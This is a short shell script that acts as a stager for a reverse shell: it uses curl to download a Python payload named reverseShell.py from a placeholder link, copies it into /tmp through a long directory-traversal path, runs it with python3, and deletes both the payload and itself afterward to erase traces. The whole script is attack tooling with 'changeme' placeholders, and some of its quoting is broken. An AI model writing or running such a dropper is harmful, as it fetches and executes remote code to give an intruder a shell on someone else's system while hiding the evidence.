#!/bin/sh
FILENAME="reverseShell.py" #changeme
PAYLOAD="https://link #changeme
PATHWAY=“../../../../../../../../../../../../tmp/" #change the destination directory as needed

delete() {
    rm -f $FILENAME
    rm -f $0
    exit 1
}


curl -o $FILENAME $PAYLOAD || delete
cp $FILENAME $PATHWAY || delete
rm -f $FILENAME


cd $PATHWAY || delete

if command -v python3 &>/dev/null; then
    python3 $FILENAME || delete
    rm -f $0
else
    delete
fi
